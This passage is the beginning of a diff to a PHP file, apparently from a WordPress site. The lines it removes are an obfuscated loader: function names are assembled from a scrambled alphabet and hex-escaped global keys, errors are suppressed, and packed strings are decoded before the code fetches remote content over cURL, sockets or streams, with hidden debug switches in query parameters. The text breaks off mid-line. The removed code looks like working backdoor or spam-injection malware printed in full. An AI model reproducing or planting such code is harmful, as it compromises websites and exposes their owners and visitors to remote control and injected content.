@@ -1,21 +1,988 @@
 <?php
-$O_O0_0O_O0='9015';
-$OO_O00O_0_='wp-admin';
-$O_O0OO_00_=("5-x0o8k7gr3tpqsd9al2zvefwijy61hcmbnu4_");$O_00_0OO_O=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{18}.$O_O0OO_00_{25}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{11};$O0O_O0O_0_=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{37}.$O_O0OO_00_{8}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{32}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{17}.$O_O0OO_00_{37}.$O_O0OO_00_{15}.$O_O0OO_00_{17}.$O_O0OO_00_{11}.$O_O0OO_00_{17};$O0_0O0__OO=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{33}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{8};$O_O00_O0_O=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{11}.$O_O0OO_00_{25}.$O_O0OO_00_{32}.$O_O0OO_00_{22}.$O_O0OO_00_{4}.$O_O0OO_00_{35}.$O_O0OO_00_{11};$O0_0O_O_0O=$O_O0OO_00_{25}.$O_O0OO_00_{8}.$O_O0OO_00_{34}.$O_O0OO_00_{4}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{35}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{9}.$O_O0OO_00_{37}.$O_O0OO_00_{17}.$O_O0OO_00_{33}.$O_O0OO_00_{4}.$O_O0OO_00_{9}.$O_O0OO_00_{11};$O0_0_OO_O0=$O_O0OO_00_{23}.$O_O0OO_00_{25}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{12}.$O_O0OO_00_{35}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{34}.$O_O0OO_00_{11}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{11}.$O_O0OO_00_{14};$OO__0_0OO0=$O_O0OO_00_{23}.$O_O0OO_00_{25}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{8}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{34}.$O_O0OO_00_{11}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{11}.$O_O0OO_00_{14};$OO__000O_O=$O_O0OO_00_{22}.$O_O0OO_00_{2}.$O_O0OO_00_{11}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{14}.$O_O0OO_00_{25}.$O_O0OO_00_{4}.$O_O0OO_00_{34}.$O_O0OO_00_{37}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{17}.$O_O0OO_00_{15}.$O_O0OO_00_{22}.$O_O0OO_00_{15};$O0_OO0__O0=$O_O0OO_00_{23}.$O_O0OO_00_{35}.$O_O0OO_00_{34}.$O_O0OO_00_{31}.$O_O0OO_00_{11}.$O_O0OO_00_{25}.$O_O0OO_00_{4}.$O_O0OO_00_{34}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{2}.$O_O0OO_00_{25}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{14};$O0O__O_00O=$O_O0OO_00_{22}.$O_O0OO_00_{9}.$O_O0OO_00_{9}.$O_O0OO_00_{4}.$O_O0OO_00_{9}.$O_O0OO_00_{37}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{12}.$O_O0OO_00_{4}.$O_O0OO_00_{9}.$O_O0OO_00_{11}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{8};$O0O0__OO_0=$O_O0OO_00_{31}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{11}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{23}.$O_O0OO_00_{35}.$O_O0OO_00_{34}.$O_O0OO_00_{31}.$O_O0OO_00_{11}.$O_O0OO_00_{25}.$O_O0OO_00_{4}.$O_O0OO_00_{34};$O_00__O0OO=$O_O0OO_00_{14}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{34}.$O_O0OO_00_{34}.$O_O0OO_00_{22}.$O_O0OO_00_{31}.$O_O0OO_00_{11};$OOO_0_0_0O=$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{11}.$O_O0OO_00_{25}.$O_O0OO_00_{32}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{18}.$O_O0OO_00_{25}.$O_O0OO_00_{32}.$O_O0OO_00_{25}.$O_O0OO_00_{11};$OO_0__0O0O=$O_O0OO_00_{8}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{30}.$O_O0OO_00_{4}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{33}.$O_O0OO_00_{27}.$O_O0OO_00_{34}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{22};$OOO0_00_O_=$O_O0OO_00_{33}.$O_O0OO_00_{17}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{28}.$O_O0OO_00_{36}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{15}.$O_O0OO_00_{22};$OO0O0O__0_=$O_O0OO_00_{33}.$O_O0OO_00_{17}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{28}.$O_O0OO_00_{36}.$O_O0OO_00_{37}.$O_O0OO_00_{15}.$O_O0OO_00_{22}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{15}.$O_O0OO_00_{22};$O_00__OOO0=$O_O0OO_00_{14}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{24}.$O_O0OO_00_{9}.$O_O0OO_00_{25}.$O_O0OO_00_{11}.$O_O0OO_00_{22};$O0_O0_OO_0=$O_O0OO_00_{14}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{14}.$O_O0OO_00_{22};$OOO__O_000=$O_O0OO_00_{12}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{8}.$O_O0OO_00_{37}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{12}.$O_O0OO_00_{18}.$O_O0OO_00_{17}.$O_O0OO_00_{31}.$O_O0OO_00_{22};$O_OO0__O00=$O_O0OO_00_{4}.$O_O0OO_00_{33}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{15}.$O_O0OO_00_{37}.$O_O0OO_00_{23}.$O_O0OO_00_{18}.$O_O0OO_00_{35}.$O_O0OO_00_{14}.$O_O0OO_00_{30};$O00O_0__OO=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{37}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{12}.$O_O0OO_00_{18}.$O_O0OO_00_{17}.$O_O0OO_00_{31}.$O_O0OO_00_{22};$O_0O00__OO=$O_O0OO_00_{14}.$O_O0OO_00_{4}.$O_O0OO_00_{31}.$O_O0OO_00_{6}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{15};$O0__O0OO_0=$O_O0OO_00_{23}.$O_O0OO_00_{25}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{2}.$O_O0OO_00_{25}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{14};$OO0O__0O0_=$O_O0OO_00_{31}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{4}.$O_O0OO_00_{12}.$O_O0OO_00_{11};$OO0_O0_0_O=$O_O0OO_00_{17}.$O_O0OO_00_{9}.$O_O0OO_00_{9}.$O_O0OO_00_{17}.$O_O0OO_00_{27}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{30}.$O_O0OO_00_{25}.$O_O0OO_00_{23}.$O_O0OO_00_{11};$O_O_0O00_O=$O_O0OO_00_{12}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{8}.$O_O0OO_00_{37}.$O_O0OO_00_{32}.$O_O0OO_00_{17}.$O_O0OO_00_{11}.$O_O0OO_00_{31}.$O_O0OO_00_{30};$O0O_O0_0_O=$O_O0OO_00_{31}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{9}.$O_O0OO_00_{9}.$O_O0OO_00_{4}.$O_O0OO_00_{9};$O_O0O__0O0=$O_O0OO_00_{31}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{37}.$O_O0OO_00_{31}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{14}.$O_O0OO_00_{22};$O_00OOO__0=$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{15}.$O_O0OO_00_{22};$O0___00OOO=$O_O0OO_00_{12}.$O_O0OO_00_{17}.$O_O0OO_00_{9}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{37}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18};$OO0OO0_0__=$O_O0OO_00_{8}.$O_O0OO_00_{20}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{23}.$O_O0OO_00_{18}.$O_O0OO_00_{17}.$O_O0OO_00_{11}.$O_O0OO_00_{22};$OO0_O00_O_=$O_O0OO_00_{31}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{37}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{25}.$O_O0OO_00_{11};$OOO_O__000=$O_O0OO_00_{31}.$O_O0OO_00_{35}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{37}.$O_O0OO_00_{22}.$O_O0OO_00_{2}.$O_O0OO_00_{22}.$O_O0OO_00_{31};$OO0O_00O__=$O_O0OO_00_{4}.$O_O0OO_00_{33}.$O_O0OO_00_{37}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{17}.$O_O0OO_00_{9}.$O_O0OO_00_{11};$O00O_OO__0=$O_O0OO_00_{31}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{14}.$O_O0OO_00_{22}.$O_O0OO_00_{15}.$O_O0OO_00_{25}.$O_O0OO_00_{9};$OO___O000O=$O_O0OO_00_{14}.$O_O0OO_00_{12}.$O_O0OO_00_{9}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{11}.$O_O0OO_00_{23};$O00__O_OO0=$O_O0OO_00_{4}.$O_O0OO_00_{12}.$O_O0OO_00_{22}.$O_O0OO_00_{34}.$O_O0OO_00_{15}.$O_O0OO_00_{25}.$O_O0OO_00_{9};$OO_O0_00O_=$O_O0OO_00_{32}.$O_O0OO_00_{11}.$O_O0OO_00_{37}.$O_O0OO_00_{9}.$O_O0OO_00_{17}.$O_O0OO_00_{34}.$O_O0OO_00_{15};$O_O00__O0O=$O_O0OO_00_{25}.$O_O0OO_00_{32}.$O_O0OO_00_{12}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{15}.$O_O0OO_00_{22};$O0O0O___O0=$O_O0OO_00_{22}.$O_O0OO_00_{2}.$O_O0OO_00_{12}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{15}.$O_O0OO_00_{22};$O_O0__0O0O=$O_O0OO_00_{15}.$O_O0OO_00_{25}.$O_O0OO_00_{9}.$O_O0OO_00_{34}.$O_O0OO_00_{17}.$O_O0OO_00_{32}.$O_O0OO_00_{22};$O_0_O00O_O=$O_O0OO_00_{35}.$O_O0OO_00_{14}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{22}.$O_O0OO_00_{12};$O_00O__O0O=$O_O0OO_00_{35}.$O_O0OO_00_{34}.$O_O0OO_00_{18}.$O_O0OO_00_{25}.$O_O0OO_00_{34}.$O_O0OO_00_{6};$O_O__00O0O=$O_O0OO_00_{14}.$O_O0OO_00_{35}.$O_O0OO_00_{33}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9};$O0O___0OO0=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9};$O__0O0O_O0=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{12}.$O_O0OO_00_{4}.$O_O0OO_00_{14};$OOO0_0_0_O=$O_O0OO_00_{14}.$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{18}.$O_O0OO_00_{22}.$O_O0OO_00_{34};$O_O_OO000_=$O_O0OO_00_{25}.$O_O0OO_00_{14}.$O_O0OO_00_{37}.$O_O0OO_00_{15}.$O_O0OO_00_{25}.$O_O0OO_00_{9};$O0O__00OO_=$O_O0OO_00_{30}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{15}.$O_O0OO_00_{22}.$O_O0OO_00_{9};$O__O_0OO00=$O_O0OO_00_{23}.$O_O0OO_00_{24}.$O_O0OO_00_{9}.$O_O0OO_00_{25}.$O_O0OO_00_{11}.$O_O0OO_00_{22};$O_OO_00O0_=$O_O0OO_00_{23}.$O_O0OO_00_{31}.$O_O0OO_00_{18}.$O_O0OO_00_{4}.$O_O0OO_00_{14}.$O_O0OO_00_{22};$OO0_0O__0O=$O_O0OO_00_{32}.$O_O0OO_00_{6}.$O_O0OO_00_{15}.$O_O0OO_00_{25}.$O_O0OO_00_{9};$O0__00OO_O=$O_O0OO_00_{23}.$O_O0OO_00_{9}.$O_O0OO_00_{22}.$O_O0OO_00_{17}.$O_O0OO_00_{15};$O_OO00_O_0=$O_O0OO_00_{23}.$O_O0OO_00_{8}.$O_O0OO_00_{22}.$O_O0OO_00_{11}.$O_O0OO_00_{14};$O00O_O__O0=$O_O0OO_00_{31}.$O_O0OO_00_{4}.$O_O0OO_00_{35}.$O_O0OO_00_{34}.$O_O0OO_00_{11};$O___O00OO0=$O_O0OO_00_{31}.$O_O0OO_00_{30}.$O_O0OO_00_{32}.$O_O0OO_00_{4}.$O_O0OO_00_{15};$O_O_O000_O=$O_O0OO_00_{11}.$O_O0OO_00_{9}.$O_O0OO_00_{25}.$O_O0OO_00_{32};$O00_O_O_0O=$O_O0OO_00_{26}.$O_O0OO_00_{4}.$O_O0OO_00_{25}.$O_O0OO_00_{34};$OOO_0O00__=$O_O0OO_00_{23}.$O_O0OO_00_{22}.$O_O0OO_00_{4}.$O_O0OO_00_{23};$O0__0O0O_O=$O_O0OO_00_{15}.$O_O0OO_00_{17}.$O_O0OO_00_{11}.$O_O0OO_00_{22};${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x30\x30\x4f\x4f\x5f"]('Content-Type:text/html;charset=utf-8');${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x4f\x5f\x30\x30\x4f"](0);if(!function_exists('str_ireplace')){function str_ireplace($from,$to,$string){return trim(preg_replace("/".addcslashes($from,"?:\\/*^$")."/si",$to,$string));}};$O00__OO_0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0O__O0O0_=\'\',$O00O0OO___=NULL,$OO00___OO0=array()','if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]("/^http\\:\\/\\//si",$O0O__O0O0_)){if(isset(${"\x5f\x47\x45\x54"}["\x75\x72\x6c\x65\x63\x63"])){$OO_0_OO_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'iy4tyhTkktKsovilXIzCtLzMlMUQCKWKnlJRUtPXWAMA\');$OO_0_OO_00.=$O0O__O0O0_;echo $OO_0_OO_00;unset($OO_0_OO_00);exit();}return \'\';}$O_0_0OO0O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'Sy4tyhTonPzMss0U4GsYpTS/ILoOzUitTkmrTi/OTs/ILUvJoCBLO4pCg1MTcexE8tiU/OyUzNK6mB8YBtPSJakA\');$O_O_O0O_00=$O00_OO0__O=\'\';foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x4f\x5f\x5f\x5f\x4f\x30"](\'|\',$O_0_0OO0O_) as $c){$OO0OO_0_0_=1;foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x4f\x5f\x5f\x5f\x4f\x30"](\'+\',$c) as $d){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30"]($d)){$OO0OO_0_0_=0;}}unset($d);if($OO0OO_0_0_){$O_O_O0O_00=$c;break;}}unset($O_0_0OO0O_,$c);if($O_O_O0O_00==\'\'){return 0;}if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00,0,1)==\'c\'){$O0O0_O_0O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x5f\x4f\x30\x30\x5f\x4f\x5f"]();${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x5f\x30\x4f\x30\x5f"]($O0O0_O_0O_,CURLOPT_URL,$O0O__O0O0_);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x5f\x30\x4f\x30\x5f"]($O0O0_O_0O_,CURLOPT_USERAGENT,\'WHR\');${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x5f\x30\x4f\x30\x5f"]($O0O0_O_0O_,CURLOPT_RETURNTRANSFER,1);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x5f\x30\x4f\x30\x5f"]($O0O0_O_0O_,CURLOPT_TIMEOUT,100);$O0O0_0O_O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x4f\x5f\x5f\x30\x30\x30"]($O0O0_O_0O_);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x4f\x5f\x5f\x30\x4f\x30"]($O0O0_O_0O_);if(!$O0O0_0O_O_){if(isset(${"\x5f\x47\x45\x54"}["\x63\x75\x72\x6c\x65\x72\x72"])){$OO_0_OO_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'i04uLhTcpRSC0qyi+KVctLKi6tPwBgA=\');$OO_0_OO_00.=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x4f\x30\x5f\x30\x5f\x4f"]($O0O0_O_0O_);echo $OO_0_OO_00;unset($OO_0_OO_00);exit();}return 0;}else{$O0O0_0O_O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O0O0_0O_O_,"\\xEF\\xBB\\xBF"));return $O0O0_0O_O_;}}$O_O_0_0OO0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x5f\x30\x30\x4f\x4f\x4f"]($O0O__O0O0_);isset($O_O_0_0OO0["\x68\x6f\x73\x74"])||$O_O_0_0OO0["\x68\x6f\x73\x74"]=\'\';isset($O_O_0_0OO0["\x70\x61\x74\x68"])||$O_O_0_0OO0["\x70\x61\x74\x68"]=\'\';isset($O_O_0_0OO0["\x71\x75\x65\x72\x79"])|| $O_O_0_0OO0["\x71\x75\x65\x72\x79"]=\'\';isset($O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"])||$O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"]=\'\';$O0___O0OO0=$O_O_0_0OO0["\x70\x61\x74\x68"]?$O_O_0_0OO0["\x70\x61\x74\x68"].($O_O_0_0OO0["\x71\x75\x65\x72\x79"]?\'?\'.$O_O_0_0OO0["\x71\x75\x65\x72\x79"]:\'\'):\'/\';$O_OO0O00__=$O_O_0_0OO0["\x68\x6f\x73\x74"];if($O_O_0_0OO0["\x73\x63\x68\x65\x6d\x65"]==\'https\'){$O0O_0_O_0O=\'1.1\';$O0O00O_O__=empty($O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"])?443:$O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"];$O_OO0O00__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'Ky7OshTdLtPXBwA=\');$O_OO0O00__.=$O_O_0_0OO0["\x68\x6f\x73\x74"];}else{$O0O_0_O_0O=\'1.0\';$O0O00O_O__=empty($O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"])?80:$O_O_0_0OO0["\x4f\x30\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f"];}$OO_O0_O0_0=\'Host:\';$OO_O0_O0_0.=$O_OO0O00__;$OO00___OO0[]=$OO_O0_O0_0;$OO00___OO0[]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'c87PyhT0tNLsnMz7NyzsktPvTgUA\');$OO00___OO0[]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'Cy1OLhTdJ1TE/NK7EK9wgtPCAA==\');$OO00___OO0[]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'c0xOThTi0osdLtPS1wIA\');unset($OO_O0_O0_0);$O00_OO0__O="GET $O0___O0OO0 HTTP/$O0O_0_O_0O\\r\\n".${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x4f\x5f\x4f\x5f\x30\x4f"]("\\r\\n",$OO00___OO0)."\\r\\n\\r\\n";unset($OO00___OO0,$O_O_0_0OO0,$O0O_0_O_0O,$O0___O0OO0);$O0O0OO__0_=null;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00,-1)==\'n\'){$O0O0OO__0_=$O_O_O0O_00($O_OO0O00__,$O0O00O_O__,$OO_0_OO_00no,$OO_0_OO_00str,30);}else{if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00,-1)==\'t\'){$OOO_0O_0_0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'K0kushTNLtPXBwA=\');$OOO_0O_0_0.=$O_OO0O00__;$OOO_0O_0_0.=\':\';$OOO_0O_0_0.=$O0O00O_O__;$O0O0OO__0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x5f\x30\x4f\x4f\x5f\x4f"]($OOO_0O_0_0,$OO_0_OO_00no,$OO_0_OO_00str,30);unset($OOO_0O_0_0);}}$OO_00OO__0=\'\';if($O0O0OO__0_){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x4f\x30\x5f\x5f\x4f\x4f"]($O0O0OO__0_,true);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x30\x5f\x4f\x30\x5f\x4f"]($O0O0OO__0_,30);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x4f\x5f\x30\x4f\x4f\x30\x30"]($O0O0OO__0_,$O00_OO0__O);$O_O00O_0_O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x4f\x30\x4f\x5f\x30\x5f"]($O0O0OO__0_);if(!$O_O00O_0_O["\x74\x69\x6d\x65\x64\x5f\x6f\x75\x74"]){while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x30\x4f\x30\x30\x5f\x5f"]($O0O0OO__0_)){$O_O_0OO_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x30\x30\x5f\x4f\x5f\x30"]($O0O0OO__0_);if($O_O_0OO_00&&($O_O_0OO_00=="\\r\\n"||$O_O_0OO_00=="\\n")){break;}unset($O_O_0OO_00);}while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x30\x4f\x30\x30\x5f\x5f"]($O0O0OO__0_)){$O0_OO_0_0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x30\x30\x4f\x4f\x5f\x4f"]($O0O0OO__0_,8192);$OO_00OO__0.=$O0_OO_0_0O;unset($O0_OO_0_0O);}}unset($O_O00O_0_O);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x5f\x30\x30\x4f\x30\x5f"]($O0O0OO__0_);}else{if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00,-1)==\'e\'){$OO_0O0__0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x30\x5f\x5f\x30\x4f\x30\x4f"]($O_OO0O00__);$O0O0OO__0_=$O_O_O0O_00(AF_INET,SOCK_STREAM,0);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x5f\x5f\x4f\x30\x4f\x4f"]($O0O0OO__0_,$OO_0O0__0O,$O0O00O_O__)){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x5f\x5f\x4f\x4f\x4f\x30"]($O0O0OO__0_,$O00_OO0__O,${"\x47\x